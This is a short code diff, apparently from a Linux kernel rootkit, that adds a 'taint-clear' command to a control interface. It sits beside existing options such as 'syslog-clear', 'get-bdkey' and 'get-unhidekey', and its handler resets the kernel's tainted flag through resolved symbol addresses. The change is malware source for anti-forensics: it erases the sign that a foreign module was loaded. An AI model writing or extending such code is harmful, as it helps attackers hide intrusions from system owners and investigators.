@@ -463,6 +463,7 @@ enum {
 	Opt_signal_task_cont,
 	Opt_signal_task_kill,
 	Opt_syslog_clear,
+	Opt_taint_clear,
 
 #ifdef DEBUG_RING_BUFFER
 	/**debug */
@@ -495,6 +496,7 @@ static const match_table_t tokens = {
 	{ Opt_signal_task_cont, "signal-task-cont=%d" },
 	{ Opt_signal_task_kill, "signal-task-kill=%d" },
 	{ Opt_syslog_clear, "syslog-clear" },
+	{ Opt_taint_clear, "taint-clear" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -684,6 +686,11 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		case Opt_syslog_clear:
 			sys_do_syslog_clear();
 			break;
+		case Opt_taint_clear: {
+			struct kernel_syscalls *kaddr = kv_kall_load_addr();
+			if (kaddr)
+				kv_reset_tainted(kaddr->tainted);
+		} break;
 		default:
 			break;
 		}
